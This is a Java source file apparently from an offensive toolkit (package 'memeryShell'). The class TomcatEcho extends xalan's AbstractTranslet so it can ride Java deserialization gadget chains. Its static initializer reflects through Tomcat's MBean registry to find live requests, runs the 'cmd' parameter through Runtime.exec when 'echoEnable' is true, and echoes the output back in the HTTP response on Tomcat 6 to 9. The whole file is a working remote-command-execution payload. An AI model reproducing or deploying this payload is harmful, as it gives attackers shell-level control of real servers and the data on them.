package com.memeryShell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.xml.internal.ws.util.ByteArrayBuffer;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.session.ManagerBase;
import org.apache.catalina.session.StandardManager;
import org.apache.catalina.util.ServerInfo;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.Response;
import org.apache.tomcat.util.buf.ByteChunk;
import org.apache.tomcat.util.modeler.BaseModelMBean;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import java.io.BufferedInputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Map;
import java.util.Set;

public class TomcatEcho extends AbstractTranslet {
    private static ArrayList<Context> standardContextArrayList = new ArrayList();
    private static Map<String, NamedObject> catalina;
    private static StandardContext standardContext = null;

    static {
        System.out.println("[+] Tomcat Echo Run...");
        try {
            init();
            System.out.println("[+] Tomcat Echo Initial...");
            //循环两次
            fetchStanderContexts();
            getStanderContext();
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("[+] Things Wrong...");
        }
        System.out.println("[+] Tomcat Echo Finished...");
    }

    private static void init() throws Exception{
        MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
        Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
        mbsInterceptorField.setAccessible(true);
        Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);

        Field repositoryField = mbsInterceptor.getClass().getDeclaredField("repository");
        repositoryField.setAccessible(true);
        Object repository = repositoryField.get(mbsInterceptor);

        Field domainTbField = repository.getClass().getDeclaredField("domainTb");
        domainTbField.setAccessible(true);
        Map<String, Map<String, NamedObject>> domainTb = (Map) domainTbField.get(repository);
        catalina = domainTb.get("Catalina");
    }

    private static void fetchStanderContexts() throws Exception{
        Set<String> set = catalina.keySet();
        //第一次，拿到所有的webapp的standerContext
        for (String key : set) {
            NamedObject namedObject = catalina.get(key);
            //Tomcat7/8
            //一层层判断下去，防止报错
            if (namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class)) {
                BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                if (key.startsWith("context=") && key.endsWith(",type=Manager")) {
                    StandardManager managedResource = (StandardManager) baseModelMBean.getManagedResource();
                    //由于Tomcat7 和 Tomcat8 稍有差异。通过反射获取较为稳定
                    //用Catch来区分是Tomcat7
                    //Tomcat7 为 container
                    try {
                        Field contextFiled = ManagerBase.class.getDeclaredField("container");
                        contextFiled.setAccessible(true);
                        StandardContext context = (StandardContext) contextFiled.get(managedResource);
                        standardContextArrayList.add(context);
                    }
                    //尝试Tomcat8
                    //Tomcat8 为 context
                    catch (NoSuchFieldException e) {
                        Field contextFiled = ManagerBase.class.getDeclaredField("context");
                        contextFiled.setAccessible(true);
                        StandardContext context = (StandardContext) contextFiled.get(managedResource);
                        standardContextArrayList.add(context);
                    }
                }
            }
            //Tomcat6
            else if (namedObject.getObject().getClass().isAssignableFrom(org.apache.catalina.mbeans.NamingResourcesMBean.class)) {
                BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                if (key.startsWith("host=") && key.contains(",type=NamingResources")) {
                    Object managedResource = baseModelMBean.getManagedResource();
                    Field contextFiled = managedResource.getClass().getDeclaredField("container");
                    contextFiled.setAccessible(true);
                    StandardContext context = (StandardContext) contextFiled.get(managedResource);
                    standardContextArrayList.add(context);
                }
            }
        }
    }

    private static void getStanderContext() throws Exception{
        //第二次，根据当前的request，找到匹配的standerContext
        Set<String> set = catalina.keySet();
        for (String key : set) {
            if (standardContext != null) {
                break;
            }
            NamedObject namedObject = catalina.get(key);
            if (namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class)) {
                BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();
                if (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) {
                    //能进入这里，说明获取到正确的request了
                    //这里的第0个，就可以获得maxRequestUri
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();
                    //判断下processors数量，有的是0，不是我们要找的
                    Field processorsField = requestGroupInfo.getClass().getDeclaredField("processors");
                    //拿第0个process的maxRequestUri作为contextPath
                    processorsField.setAccessible(true);
                    ArrayList<RequestInfo> processors = (ArrayList) processorsField.get(requestGroupInfo);
                    //排除掉processors是0的
                    if (processors.size() > 0) {
                        RequestInfo requestInfo0 = processors.get(0);
                        String maxRequestUri = requestInfo0.getMaxRequestUri(); //As context path
                        for (Context context : standardContextArrayList) {
                            if (context.getClass().isAssignableFrom(StandardContext.class)) {
                                StandardContext standardContextTmp = (StandardContext) context;
                                String standardContextPath = standardContextTmp.getPath();
                                //当前request contextPath 和 standardContextPath匹配
                                //则说明获取到真正的request了
                                //可操作
                                if (maxRequestUri.contains(standardContextPath)) {
                                    standardContext = standardContextTmp;
                                    for (RequestInfo processor : processors) {
                                        //全部processor都打上回显吧。免得有些回显不到
                                        Field reqField = processor.getClass().getDeclaredField("req");
                                        reqField.setAccessible(true);
                                        Request req = (Request) reqField.get(processor);
                                        Response response = req.getResponse();
                                        echo(req, response);
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private static void echo(Request req, Response response) throws Exception{
        //根据请求,命令执行和回显
        String cmd = req.getParameters().getParameter("cmd");
        String echoEnable = req.getParameters().getParameter("echoEnable");
        if ("true".equals(echoEnable) && cmd != null){
            InputStream execInputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedInputStream bufferedInputStream = new BufferedInputStream(execInputStream);
            ByteArrayBuffer byteArrayBuffer = new ByteArrayBuffer();
            int pos = 0;
            //1Mb一段读取
            byte[] buffer = new byte[1024];
            int len;
            while((len = bufferedInputStream.read(buffer)) > 0){
                byteArrayBuffer.write(buffer, 0, len);
                pos += len;
            }
            //回显
            Field outputBufferFiled = response.getClass().getDeclaredField("outputBuffer");
            outputBufferFiled.setAccessible(true);
            Object outputBuffer = outputBufferFiled.get(response);
            //通用的是打byteBuffer - Tomcat 8/9
            try {
                ByteBuffer resByteBuffer = ByteBuffer.allocate(byteArrayBuffer.toByteArray().length);
                resByteBuffer.put(byteArrayBuffer.toByteArray());
                resByteBuffer.position(0);

                Method doWriteMethod = outputBuffer.getClass().getDeclaredMethod("doWrite", ByteBuffer.class);
                doWriteMethod.setAccessible(true);
                doWriteMethod.invoke(outputBuffer, resByteBuffer);
                bufferedInputStream.close();
            }
            catch (NoSuchMethodException e){
                //ByteChunk chunk, Response response
                ByteChunk byteChunk = new ByteChunk();
                byteChunk.append(byteArrayBuffer.toByteArray(), 0, byteArrayBuffer.toByteArray().length);
                Method doWriteMethod;
                //Tomcat 7. 需要getSuperclass()拿到doWrite()
                try {
                    doWriteMethod = outputBuffer.getClass().getSuperclass().getDeclaredMethod("doWrite", new Class[]{ByteChunk.class, Response.class});
                }
                ///Tomcat 6，不需要getSuperclass()拿到doWrite()
                catch (NoSuchMethodException ee){
                    doWriteMethod = outputBuffer.getClass().getDeclaredMethod("doWrite", new Class[]{ByteChunk.class, Response.class});
                }
                doWriteMethod.setAccessible(true);
                doWriteMethod.invoke(outputBuffer, new Object[]{byteChunk, response});
                bufferedInputStream.close();
            }
        }
    }

    private static String getTomcatVersion(){
        String serverInfo = ServerInfo.getServerInfo();
        return serverInfo;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
